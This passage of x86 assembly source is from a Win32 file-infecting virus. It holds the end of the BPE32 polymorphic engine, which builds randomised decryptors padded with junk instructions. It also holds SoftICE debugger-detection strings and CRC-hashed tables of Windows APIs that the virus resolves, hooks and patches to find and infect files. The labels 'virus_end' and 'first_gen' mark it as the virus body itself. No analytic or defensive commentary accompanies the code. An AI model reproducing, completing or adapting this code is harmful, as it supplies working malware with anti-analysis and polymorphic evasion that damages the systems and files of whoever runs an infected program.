	cmp al, bh
	je greg3
	cmp al, cl
	je greg3
	mov ch, al
	mov edx, 0			;get encryption key value
xor_key = dword ptr $ - 4

	push 3
	call random
	test eax, eax
	je k_next1
	cmp al, 1
	je k_next2

	push ebx				;XOR reg, reg
	mov bl, ch				;OR, ADD, XOR reg, value
	call make_xor
	pop ebx

	mov al, 81h
	stosb
	push 3
	call random
	test eax, eax
	je k_nxt2
	cmp al, 1
	je k_nxt3

	mov al, 0c0h
k_nxt1:	add al, ch
	stosb
	xchg eax, edx
n_end1:	stosd
k_end:	call rjunk
	ret
k_nxt2:	mov al, 0f0h
	jmp k_nxt1
k_nxt3:	mov al, 0c8h
	jmp k_nxt1
k_next1:mov al, 0b8h				;MOV reg, value
	jmp k_nxt1
k_next2:mov al, 68h				;PUSH value
	stosb					;POP reg
	xchg eax, edx
	stosd
	mov al, ch
	add al, 58h
	jmp i_end1
greg3	endp

greg4	proc
	mov edx, 0 			;get key increment value
key_inc = dword ptr $ - 4
i_next:	push 3
	call random
	test eax, eax
	je i_next0
	cmp al, 1
	je i_next1
	cmp al, 2
	je i_next2

	mov al, 90h				;XCHG EAX, reg
	add al, ch				;XOR reg, reg
	stosb					;OR reg, EAX
	push ebx				;ADD reg, value
	mov bl, ch
	call make_xor
	pop ebx
	mov al, 0bh
	stosb
	mov al, 18h
	add al, ch
	rol al, 3
	stosb
i_next0:mov al, 81h				;ADD reg, value
	stosb
	mov al, 0c0h
	add al, ch
	stosb
	xchg eax, edx
	jmp n_end1
i_next1:mov al, 0b8h				;MOV EAX, value
	stosb					;ADD reg, EAX
	xchg eax, edx
	stosd
	mov al, 3
	stosb
	mov al, 18h
	or al, ch
	rol al, 3
i_end1:	stosb
i_end2:	call rjunk
	ret
i_next2:mov al, 8bh				;MOV EAX, reg
	stosb					;ADD EAX, value
	mov al, 0c0h				;XCHG EAX, reg
	add al, ch
	stosb
	mov al, 5
	stosb
	xchg eax, edx
	stosd
	mov al, 90h
	add al, ch
	jmp i_end1
greg4	endp

greg5	proc
	push ecx
	mov ch, bh
	push 4
	pop edx
	push 2
	call random
	test eax, eax
	jne ng5
	call i_next				;same as previous, value=4
	pop ecx
	jmp k_end
ng5:	mov al, 40h				;4x inc reg
	add al, ch
	pop ecx
	stosb
	stosb
	stosb
	jmp i_end1
greg5	endp

greg6	proc
	push 5
	call random
	test eax, eax
	je d_next0
	cmp al, 1
	je d_next1
	cmp al, 2
	je d_next2

	mov al, 83h				;SUB reg, 1
	stosb
	mov al, 0e8h
	add al, cl
	stosb
	mov al, 1
	jmp i_end1
d_next0:mov al, 48h				;DEC reg
	add al, cl
	jmp i_end1
d_next1:mov al, 0b8h				;MOV EAX, random_value
	stosb					;SUB reg, EAX
	push 0					;ADD reg, random_value-1
	call random
	mov edx, eax
	stosd
	mov al, 2bh
	stosb
	mov al, 18h
	add al, cl
	rol al, 3
	stosb
	mov al, 81h
	stosb
	mov al, 0c0h
	add al, cl
	stosb
	dec edx
	mov eax, edx
	jmp n_end1
d_next2:mov al, 90h				;XCHG EAX, reg
	add al, cl				;DEC EAX
	stosb					;XCHG EAX, reg
	mov al, 48h
	stosb
	mov al, 90h
	add al, cl
	jmp i_end1
greg6	endp

greg7	proc
	mov edx, [esp+4]
	dec edx
	push 2
	call random
	test eax, eax
	je l_next0
	mov al, 51h				;PUSH ECX
	stosb					;MOV ECX, reg
	mov al, 8bh				;JECXZ label
	stosb					;POP ECX
	mov al, 0c8h				;JMP decrypt_loop
	add al, cl				;label:
	stosb					;POP ECX
	mov eax, 0eb5903e3h
	stosd
	sub edx, edi
	mov al, dl
	stosb
	mov al, 59h
	jmp l_next
l_next0:push ebx				;XOR EAX, EAX
	xor bl, bl				;DEC EAX
	call make_xor				;ADD EAX, reg
	pop ebx					;JNS decrypt_loop
	mov al, 48h
	stosb
	mov al, 3
	stosb
	mov al, 0c0h
	add al, cl
	stosb
	mov al, 79h
	stosb
	sub edx, edi
	mov al, dl
l_next:	stosb
	call rjunk
	ret Pshd
greg7	endp

rjunkjc:push 7
	call random
	jmp rjn
rjunk	proc			;junk instruction generator
	push 8
	call random		;0=5, 1=1+2, 2=2+1, 3=1, 4=2, 5=3, 6=none, 7=dummy jump and call
rjn:	test eax, eax
	je j5
	cmp al, 1
	je j_1x2
	cmp al, 2
	je j_2x1
	cmp al, 4
	je j2
	cmp al, 5
	je j3
	cmp al, 6
	je r_end
	cmp al, 7
	je jcj

j1:	call junx1		;one byte junk instruction
	nop
	dec eax
	SALC
	inc eax
	clc
	cwde
	stc
	cld
junx1:	pop esi
	push 8
	call random
	add esi, eax
	movsb
	ret
j_1x2:	call j1			;one byte and two byte
	jmp j2
j_2x1:	call j2			;two byte and one byte
	jmp j1
j3:	call junx3
	db	0c1h, 0c0h	;rol eax, ...
	db	0c1h, 0e0h	;shl eax, ...
	db	0c1h, 0c8h	;ror eax, ...
	db	0c1h, 0e8h	;shr eax, ...
	db	0c1h, 0d0h	;rcl eax, ...
	db	0c1h, 0f8h	;sar eax, ...
	db	0c1h, 0d8h	;rcr eax, ...
	db	083h, 0c0h
	db	083h, 0c8h
	db	083h, 0d0h
	db	083h, 0d8h
	db	083h, 0e0h
	db	083h, 0e8h
	db	083h, 0f0h
	db	083h, 0f8h	;cmp eax, ...
	db	0f8h, 072h	;clc; jc ...
	db	0f9h, 073h	;stc; jnc ...

junx3:	pop esi			;three byte junk instruction
	push 17
	call random
	imul eax, 2
	add esi, eax
	movsb
	movsb
r_ran:	push 0
	call random
	test al, al
	je r_ran
	stosb
	ret
j2:	call junx2
	db	8bh		;mov eax, ...
	db	03h		;add eax, ...
	db	13h		;adc eax, ...
	db	2bh		;sub eax, ...
	db	1bh		;sbb eax, ...
	db	0bh		;or eax, ...
	db	33h		;xor eax, ...
	db	23h		;and eax, ...
	db	33h		;test eax, ...

junx2:	pop esi			;two byte junk instruction
	push 9
	call random
	add esi, eax
	movsb
	push 8
	call random
	add al, 11000000b
	stosb
r_end:	ret
j5:	call junx5
	db	0b8h		;mov eax, ...
	db	05h		;add eax, ...
	db	15h		;adc eax, ...
	db	2dh		;sub eax, ...
	db	1dh		;sbb eax, ...
	db	0dh		;or eax, ...
	db	35h		;xor eax, ...
	db	25h		;and eax, ...
	db	0a9h		;test eax, ...
	db	3dh		;cmp eax, ...

junx5:	pop esi			;five byte junk instruction
	push 10
	call random
	add esi, eax
	movsb
	push 0
	call random
	stosd
	ret
jcj:	call rjunkjc		;junk
	push edx		;CALL label1
	push ebx		;junk
	push ecx		;JMP label2
	mov al, 0e8h		;junk
	stosb			;label1: junk
	push edi		;RET
	stosd			;junk
	push edi		;label2:
	call rjunkjc		;junk
	mov al, 0e9h
	stosb
	mov ecx, edi
	stosd
	mov ebx, edi
	call rjunkjc
	pop eax
	sub eax, edi
	neg eax
	mov edx, edi
	pop edi
	stosd
	mov edi, edx
	call rjunkjc
	mov al, 0c3h
	stosb
	call rjunkjc
	sub ebx, edi
	neg ebx
	xchg eax, ebx
	push edi
	mov edi, ecx
	stosd
	pop edi
	call rjunkjc
	pop ecx
	pop ebx
	pop edx
	ret
rjunk	endp
BPE32     EndP			;BPE32 ends here


szK32			db	'KERNEL32.dll',0	;name of DLL
sice95			db	'\\.\SICE',0		;SoftICE/95/98
siceNT			db	'\\.\NTICE',0		;SoftICE/NT
;APIs needed at run-time
crcAPIs			dd	0AE17EBEFh		;FindFirstFileA
			dd	0AA700106h		;FindNextFileA
			dd	0C200BE21h		;FindClose
			dd	03C19E536h		;SetFileAttributesA
			dd	04B2A3E7Dh		;SetFileTime
			dd	08C892DDFh		;CreateFileA
			dd	096B2D96Ch		;CreateFileMappingA
			dd	0797B49ECh		;MapViewOfFile
			dd	094524B42h		;UnmapViewOfFile
			dd	019F33607h		;CreateThread
			dd	0D4540229h		;WaitForSingleObject
			dd	068624A9Dh		;CloseHandle
			dd	020B943E7h		;CreateMutexA
			dd	0C449CF4Eh		;ReleaseMutex
			dd	0C6F22166h		;OpenMutexA
			dd	00AC136BAh		;Sleep
			dd	079C3D4BBh		;VirtualProtect
			dd	0EB1CE85Ch		;GetCurrentProcessId
			dd	033D350C4h		;OpenProcess
			dd	041A050AFh		;TerminateProcess
			dd	04134D1ADh		;LoadLibraryA
			dd	0FFC97C1Fh		;GetProcAddress
			dd	0AFDF191Fh		;FreeLibrary

;APIs to hook
crchAPIs		dd	0AE17EBEFh		;FindFirstFileA
			dd	0AA700106h		;FindNextFileA
			dd	05BD05DB1h		;CopyFileA
			dd	0953F2B64h		;CopyFileExA
			dd	08C892DDFh		;CreateFileA
			dd	0267E0B05h		;CreateProcessA
			dd	0DE256FDEh		;DeleteFileA
			dd	0C633D3DEh		;GetFileAttributesA
			dd	08F48B20Dh		;GetFullPathNameA
			dd	0F2F886E3h		;_lopen
			dd	02308923Fh		;MoveFileA
			dd	03BE43958h		;MoveFileExA
			dd	068D8FC46h		;OpenFile
			dd	03C19E536h		;SetFileAttributesA
			dd	028452C4Fh		;WinExec
			dd	040F57181h		;ExitProcess
			dd	0058F9201h		;ExitThread
			dd	087D52C94h		;GetLastError
			dd	068624A9Dh		;CloseHandle

;APIs to patch
crcpAPIs		dd	0E141042Ah		;GetProcessHeap
			dd	042F13D06h		;GetVersion
			dd	0DE5C074Ch		;GetVersionEx
			dd	052CA6A8Dh		;GetStartupInfoA
			dd	04E52DF5Ah		;GetStartupInfoW
	       		dd	03921BF03h		;GetCommandLineA
			dd	025B90AD4h		;GetCommandLineW
			dd	003690E66h		;GetCurrentProcess
			dd	019F33607h		;CreateThread
			dd	082B618D4h		;GetModuleHandleA
			dd	09E2EAD03h		;GetModuleHandleW
			dd	?
virus_end:						;end of virus in host

tmp			dd	?			;temporary variable
			org tmp				;overlay
WFD		WIN32_FIND_DATA ?			;Win32 Find Data
WFD2		WIN32_FIND_DATA ?			;Win32 Find Data
data_buffer		db	256 dup (?)		;buffer for VLCB_TData
size_unint = $ - virus_end				;size of unitialized
							;variables

;used only by first generation of virus
workspace1		db	16 dup (?)		;usd by compression
workspace2		db	16 dup (?)		;engine
_GetModuleHandleA	dd	offset GetModuleHandleA
ends							;end of code section
End first_gen						;end of virus




